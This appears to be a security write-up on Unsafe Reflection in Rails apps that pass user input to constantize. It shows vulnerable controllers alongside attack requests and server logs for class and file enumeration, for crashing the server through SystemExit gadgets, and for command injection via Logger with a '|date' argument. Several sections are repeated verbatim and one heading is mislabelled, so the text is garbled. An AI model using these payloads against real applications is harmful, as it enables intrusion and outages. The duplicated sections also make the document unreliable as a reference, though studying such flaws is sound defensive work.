Unsafe User Reflection
======================

There is a class of vulnerabilities known as Unsafe Reflection [1] that has not been much discussed in the Ruby/Rails circle, despite being somewhat related to the recent deserialization vulnerabilities found in Rails. Unsafe Reflection vulnerabilities via constant creation occur in Ruby normally when the Module#const_get method is called with user-controlled data.

The Rails framework expands the number of reflection methods by defining String#constantize, String#safe_constantize and Module#qualified_const_get, all of them prone to Unsafe Reflection given an user-controlled input. These methods take a string and try to find a constant with the name specified, as can be seen in the following example:

```
Loading development environment (Rails 3.2.12)
irb(main):001:0> "File".constantize
=> File
irb(main):002:0> "Raaa".constantize
NameError: uninitialized constant Raaa
...
```

This is a dangerous code pattern [2] and very common, as we can see on GitHub [3]. The exploitation of this vulnerability depends on what is done with the returned constants. Generally, the attacker can change the application control flow in ways not intended by the developer to bypass security checks or execute unexpected operations.

A common use for these constants is to call the new and find methods. This observation is valuable to design techniques suitable to exploit these vulnerabilities. A few exploitation techniques for common Unsafe Reflection code patterns are shown below.

**Class and module enumeration**

It is possible to enumerate classes and modules (and gems) in the target system watching for uncaught exceptions. Example:

```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        ...
    end
```

**Querying a non-existing module**

```
Started GET "/teste/index?class=Raaaaa" for 127.0.0.1 at 2013-02-10 21:09:01 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"Raaaaa"}
Completed 500 Internal Server Error in 2ms

NameError (uninitialized constant Raaaaa):
  app/controllers/teste_controller.rb:3:in `index'
```

**Querying a non-existing module**

```
Started GET "/teste/index?class=Devise" for 127.0.0.1 at 2013-02-10 21:14:14 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"Devise"}
  Rendered teste/index.html.erb within layouts/application (1.1ms)
Completed 200 OK in 403ms (Views: 401.8ms | ActiveRecord: 0.0ms)
```

**File and directory enumeration**

If the code makes a call to new with an user-controllable parameter, then you can use it to enumerate files and directories in the system. Example:
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```
**Querying an existing file**

```
Started GET "/teste/index?class=File&arg=/etc/passwd" for 127.0.0.1 at 2013-02-10 21:20:05 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"File", "arg"=>"/etc/passwd"}
  Rendered teste/index.html.erb within layouts/application (0.1ms)
Completed 200 OK in 9ms (Views: 8.6ms | ActiveRecord: 0.0ms)
```
**Querying a non-existing file**

```
Started GET "/teste/index?class=File&arg=raaaaaaaa" for 127.0.0.1 at 2013-02-10 21:20:32 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"File", "arg"=>"raaaaaaaa"}
Completed 500 Internal Server Error in 0ms

Errno::ENOENT (No such file or directory - raaaaaaaa):
```

**Denial of Service**

It is possible to cause a Denial of Service attack, for example, by targeting classes which create symbols from user-controlled input or allow calling arbitrary methods. Example:

```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```

**Taking advantage of ActionController::MimeResponds::Collector in Rails 3.2.12. Use "exit!" to shutdown the application server.**

```
Started GET "/teste/index?class=ActionController::MimeResponds::Collector&arg[]=exit" for 127.0.0.1 at 2013-02-10 21:27:01 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"ActionController::MimeResponds::Collector", "arg"=>["exit"]}
Completed 500 Internal Server Error in 1ms
SystemExit (exit):
  app/controllers/teste_controller.rb:4:in `new'
  app/controllers/teste_controller.rb:4:in `index'

```

**Another Example:**
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg1], params[:arg2])
        r = obj.somemethod
        ...
    end
```
**File and directory enumeration**

If the code makes a call to new with an user-controllable parameter, then you can use it to enumerate files and directories in the system. Example:
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```

**Querying an existing file**

```
Started GET "/teste/index?class=File&arg=/etc/passwd" for 127.0.0.1 at 2013-02-10 21:20:05 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"File", "arg"=>"/etc/passwd"}
  Rendered teste/index.html.erb within layouts/application (0.1ms)
Completed 200 OK in 9ms (Views: 8.6ms | ActiveRecord: 0.0ms)
```

**Querying a non-existing file**

```
Started GET "/teste/index?class=File&arg=raaaaaaaa" for 127.0.0.1 at 2013-02-10 21:20:32 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"File", "arg"=>"raaaaaaaa"}
Completed 500 Internal Server Error in 0ms

Errno::ENOENT (No such file or directory - raaaaaaaa):

```
**Denial of Service**

It is possible to cause a Denial of Service attack, for example, by targeting classes which create symbols from user-controlled input or allow calling arbitrary methods. Example:
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```
**Taking advantage of ActionController::MimeResponds::Collector in Rails 3.2.12. Use "exit!" to shutdown the application server.**

```
Started GET "/teste/index?class=ActionController::MimeResponds::Collector&arg[]=exit" for 127.0.0.1 at 2013-02-10 21:27:01 -0200
Processing by TesteController#index as HTML
  Parameters: {"class"=>"ActionController::MimeResponds::Collector", "arg"=>["exit"]}
Completed 500 Internal Server Error in 1ms
SystemExit (exit):
  app/controllers/teste_controller.rb:4:in `new'
  app/controllers/teste_controller.rb:4:in `index'
```

**Another Example:**
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg1], params[:arg2])
        r = obj.somemethod
        ...
    end
```
**Taking advantage of ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy [4] in Rails 3.2.12. Use "exit!" to shutdown the application server.**

```
Started GET "/teste/index?class=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&arg1=xxx&arg2=exit" for 127.0.0.1 at 2013-02-10 21:51:01 -0200
Connecting to database specified by database.yml
Processing by TesteController#index as HTML
  Parameters: {"class"=>"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", "arg1"=>"xxx", "arg2"=>"exit"}
DEPRECATION WARNING: @exit is deprecated! Call exit.somemethod instead of @exit.somemethod. Args: []. (called from index at /home/user/myapp/app/controllers/teste_controller.rb:5)
Completed 500 Internal Server Error in 1ms

SystemExit (exit):
  app/controllers/teste_controller.rb:5:in `index'

```

**Command Injection**

If the code calls the new method, one way to achieve command injection is to instantiate the Logger class. Example:
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```
Executing a "date" command
```
Sun Feb 10 21:33:33 BRST 2013



Started GET "/teste/index?class=Logger&arg=%7cdate" for 127.0.0.1 at 2013-02-10 21:33:32 -0200
Connecting to database specified by database.yml
Processing by TesteController#index as HTML
  Parameters: {"class"=>"Logger", "arg"=>"|date"}
  Rendered teste/index.html.erb within layouts/application (3.8ms)
Completed 200 OK in 344ms (Views: 87.8ms | ActiveRecord: 0.0ms)
```


A safer way to use these methods is to apply a whitelist check over the string before the call to ensure that an allowed class/module will be constantized.
Taking advantage of ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy [4] in Rails 3.2.12. Use "exit!" to shutdown the application server.
```

Started GET "/teste/index?class=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&arg1=xxx&arg2=exit" for 127.0.0.1 at 2013-02-10 21:51:01 -0200
Connecting to database specified by database.yml
Processing by TesteController#index as HTML
  Parameters: {"class"=>"ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy", "arg1"=>"xxx", "arg2"=>"exit"}
DEPRECATION WARNING: @exit is deprecated! Call exit.somemethod instead of @exit.somemethod. Args: []. (called from index at /home/user/myapp/app/controllers/teste_controller.rb:5)
Completed 500 Internal Server Error in 1ms

SystemExit (exit):
  app/controllers/teste_controller.rb:5:in `index'
```

**Command Injection**

If the code calls the new method, one way to achieve command injection is to instantiate the Logger class. Example:
```
class TesteController < ApplicationController
    def index
        klass = params[:class].constantize
        obj = klass.new(params[:arg])
        ...
    end
```
Executing a "date" command
```
Sun Feb 10 21:33:33 BRST 2013



Started GET "/teste/index?class=Logger&arg=%7cdate" for 127.0.0.1 at 2013-02-10 21:33:32 -0200
Connecting to database specified by database.yml
Processing by TesteController#index as HTML
  Parameters: {"class"=>"Logger", "arg"=>"|date"}
  Rendered teste/index.html.erb within layouts/application (3.8ms)
Completed 200 OK in 344ms (Views: 87.8ms | ActiveRecord: 0.0ms)

```

A safer way to use these methods is to apply a whitelist check over the string before the call to ensure that an allowed class/module will be constantized.
